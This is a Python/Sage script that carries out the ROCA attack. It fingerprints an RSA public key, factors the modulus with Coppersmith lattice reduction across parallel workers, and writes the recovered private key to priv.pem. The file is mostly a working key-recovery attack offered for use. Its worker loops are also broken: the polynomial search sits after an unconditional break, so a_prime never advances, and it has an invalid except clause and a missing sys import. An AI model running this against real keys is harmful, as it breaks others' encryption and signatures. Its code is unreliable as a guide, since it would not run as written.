#! /usr/bin/python
# -*- coding: utf-8 -*-

import argparse                                       # Arguments parsing (key file)
from sage.doctest.util import Timer                   # Benchmarking and timing attack
from sage.all_cmdline import *                        # Used for coppersmith
from Crypto.PublicKey import RSA                      # Key parsing
import multiprocessing                                # Parrallelisation of the attack
from decimal import Decimal                           # Arbitrary length floating-point calculation
import humanfriendly                                  # Print nice time 

# https://github.com/crocs-muni/roca
from detect import RocaFingerprinter                  # Test if key is vulnerable

# Hardcoded parameters for efficiency
# Found using params.py
param = \
{
  512: {
    "n": 39,
    "a_max": 62,
    "k_max": 37,
    "M": 0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6,
    "M_prime": 0x1b3e6c9433a7735fa5fc479ffe4027e13bea,
    "m": 5,
    "t": 6,
    "c_a": 0x80000
  },
  1024: {
    "n": 71,
    "a_max": 134,
    "k_max": 37,
    "M": 0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382,
    "M_prime": 0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e,
    "m": 4,
    "t": 5,
    "c_a": 0x40000000
  },
  2048: {
    "n": 126,
    "a_max": 434,
    "k_max": 53,
    "M": 0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6,
    "M_prime": 0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6,
    "m": 7,
    "t": 8,
    "c_a": 0x400000000
  }
}

# https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage
def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
    """
    Coppersmith revisited by Howgrave-Graham
    
    finds a solution if:
    * b|N, b >= N^beta , 0 < beta <= 1
    * |x| < XX
    """
    #
    # init
    #
    dd = pol.degree()
    nn = dd * mm + tt
    
    #
    # checks
    #
    if not 0 < beta <= 1 :
        raise ValueError("beta should belongs in (0, 1]")

    if not pol.is_monic():
        raise ArithmeticError("Polynomial must be monic.")

    
    #
    # Coppersmith revisited algo for univariate
    #

    # change ring of pol and x
    polZ = pol.change_ring(ZZ)
    x = polZ.parent().gen()

    # compute polynomials
    gg = []
    for ii in range(mm):
        for jj in range(dd):
            gg.append((x * XX)**jj * N**(mm - ii) * polZ(x * XX)**ii)
    for ii in range(tt):
        gg.append((x * XX)**ii * polZ(x * XX)**mm)
    
    # construct lattice B
    BB = Matrix(ZZ, nn)
    
    for ii in range(nn):
        for jj in range(ii+1):
            BB[ii, jj] = gg[ii][jj]

    # LLL
    BB = BB.LLL(early_red=True, use_siegel=True)

    # transform shortest vector in polynomial    
    new_pol = 0
    for ii in range(nn):
        new_pol += x**ii * BB[0, ii] / XX**ii

    # factor polynomial
    potential_roots = new_pol.roots()

    return [i[0] for i in potential_roots]

def benchmark(N, cores):
  
  # Key is not always of perfect size, infer from size
  keylength = int(log(N, 2))
  if keylength < 1000 :
    keylength = 512
  elif  keylength < 2000 :
    keylength = 1024 
  elif keylength < 4000 :
    keylength = 2048 
  else:
    keylength = 4096 
  print ("[+] RSA-%i key" % keylength)

  # Define parameters for coppersmith
  M_prime = param[keylength]['M_prime']
  beta = 0.5 
  mm = param[keylength]['m']
  tt = param[keylength]['t']
  c_prime = discrete_log(N, Mod(65537, M_prime))
  ord_prime = Zmod(M_prime)(65537).multiplicative_order()
  start = param[keylength]['c_a']
  top = (c_prime + ord_prime)/2
  XX = int((2*pow(N, Decimal(beta))) / M_prime) 
  divisor = 1

  print ("[+] N = %i" % N)
  print ("[+] c' = %i" % c_prime)
  
  # Check if cherry-picked
  if (c_prime % 2) != 0:
    print ("[+] c' is odd: we only  need to iterate over even a'")
    divisor = 2
  
  # Construct polynomial
  a_prime = start
  m_inv = int(inverse_mod(M_prime, N))
  k_tmp = int(pow(65537, a_prime, M_prime))
  known_part_pol = int(k_tmp * m_inv)
  F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
  (x,) = F._first_ngens(1)
  pol = x + known_part_pol
  
  # Time coppersmith
  timer = Timer()
  timer.start()
  roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
  coppersmith_time = timer.stop().cputime
  
  print ("[+] Time for 1 coppersmith iteration: %s" % humanfriendly.format_timespan(coppersmith_time))

  # Estimate time needed
  total = (((top - start)/divisor/cores) * coppersmith_time)
  print ("[+] Estimated (worst case) time needed for the attack: %s" % humanfriendly.format_timespan(total))


class Worker(multiprocessing.Process):
     
  def run(self):
    try:
      # Fetch parameters according to key size
      N, keylength, start, stop, factors_queue, manager = self._args      
      M_prime = param[keylength]['M_prime']
      beta = 0.5 
      mm = param[keylength]['m']
      tt = param[keylength]['t']

      # Uses decimal for arbitrary floating point precision
      XX = int((2*pow(N, Decimal(beta))) / M_prime) 

      # Bruteforce until p, q are found

      # First try all even a' (a' is stongly biased to be even):
      a_prime = start
      while a_prime < stop:
        if manager.finished:
          break 
          
          # Construct polynomial
          m_inv = int(inverse_mod(M_prime, N))
          k_tmp = int(pow(65537, a_prime, M_prime))
          known_part_pol = int(k_tmp * m_inv)
          F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
          (x,) = F._first_ngens(1)
          pol = x + known_part_pol
          
          # Get roots of polynomial using coppersmith
          roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
         
          # Check if roots are p, q
          for root in roots:
            factor1 = k_tmp + abs(root) * M_prime
            if mod(N, factor1) == 0:
              factor2 = N // factor1
              factors_queue.put((factor1, factor2))
              print ("[+] p, q", factor1, factor2)
              manager.finished = True
              break
          a_prime += 2 # Only even
      
      # If not found iterate over odd a'
      a_prime = start + 1
      while a_prime < stop:
        if manager.finished:
          break 
          
          # Construct polynomial
          m_inv = int(inverse_mod(M_prime, N))
          k_tmp = int(pow(65537, a_prime, M_prime))
          known_part_pol = int(k_tmp * m_inv)
          F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
          (x,) = F._first_ngens(1)
          pol = x + known_part_pol
          
          # Get roots of polynomial using coppersmith
          roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
         
          # Check if roots are p, q
          for root in roots:
            factor1 = k_tmp + abs(root) * M_prime
            if mod(N, factor1) == 0:
              factor2 = N // factor1
              factors_queue.put((factor1, factor2))
              print ("[+] p, q", factor1, factor2)
              manager.finished = True
              break
          a_prime += 2  # Only odd 

    except KeyboardInterrupt as e:
        print ("[-] Ctrl+C issued ...")
        print ("[-] Terminating ...")
        sys.exit(0)

# Top level of the attack, feeds the queue for the workers
def roca(N, cpus=1):
  
  # Key is not always of perfect size, infer from size
  keylength = int(log(N, 2))
  if keylength < 1000 :
    keylength = 512
  elif  keylength < 2000 :
    keylength = 1024 
  elif keylength < 4000 :
    keylength = 2048 
  else:
    keylength = 4096 

  # Parrallelization options  
  processes = []
  manager = multiprocessing.Manager()
  manager.finished = False
  factors_queue = multiprocessing.Queue()
  
  # bruteforce
  M_prime = param[keylength]['M_prime']
  c_prime = discrete_log(N, Mod(65537, M_prime))
  ord_prime = Zmod(M_prime)(65537).multiplicative_order()
  
  top = (c_prime + ord_prime)/2
  
  # Spawn processes
  for i in range(1, cpus+1):
    if i == 1:
      start, stop = param[keylength]['c_a'], floor(top / cpus)
    else:
      start, stop = floor(top * (i-1) / cpus), floor(top * i / cpus)    
    w = Worker(args=(N, keylength, start, stop, factors_queue, manager))
    w.start()
    processes.append(w)

  # When factors are found, fetch them from queue
  factors = factors_queue.get()
 
  for i in processes:
    i.join()
  
  # Return p, q in list
  return [int(f) for f in factors]
   

# Main entry point, argument parsing
if __name__ == '__main__':
  try:
    # Parse arguments
    parser = argparse.ArgumentParser(description='Factor ROCA-vulnerable keys', add_help=True)
    parser.add_argument("public_key_path", type=str, help=\
  """X.509 subjectPublicKeyInfo DER SEQUENCE (binary or PEM encoding), PKCS#1 RSAPublicKey DER SEQUENCE (binary or PEM encoding), OpenSSH (textual public key only)""")
    parser.add_argument("-j", "--cores", type=int, nargs='?', default=1, help=\
  """CPU cores to use for parrallelization""")
    args = parser.parse_args()

    # Read public key
    try:
      print ("[+] Importing key")
      f = open(args.public_key_path, "rb")
      pub_key = RSA.importKey(f.read())
    except e:
      print ("[-]", e)
    
    # https://github.com/crocs-muni/roca
    fingerprinter = RocaFingerprinter()
    vulnerable = fingerprinter.has_fingerprint_dlog(pub_key.n)

    if vulnerable:
      print ("[+] Key is vulnerable")
      
      # Benchmark one coppersmith and provide time estimate
      benchmark(pub_key.n, args.cores)
      
      # Factorize public key
      timer = Timer()
      timer.start()
      p, q = roca(pub_key.n, args.cores)
      stop = timer.stop().cputime

      print ("[+] Found factors of N:")
      print ("[+] p =" , p)
      print ("[+] q =" , q)
      print ("[+] Took", stop, "s")

      # Construct private key 
      phi = (p-1) * (q-1)
      d = int(inverse_mod(pub_key.e, phi))
      priv_key = RSA.construct((pub_key.n, pub_key.e, d, p, q))

      # Output private key
      print ("[+] Exporting key to priv.pem")
      open("priv.pem", "wb").write(priv_key.exportKey())
    
    else:
      print ("[-] Key is not vulnerable to ROCA!")

  except KeyboardInterrupt as e:
        print ("[-] Ctrl+C issued ...")
        print ("[-] Terminating ...")
        sys.exit(0)
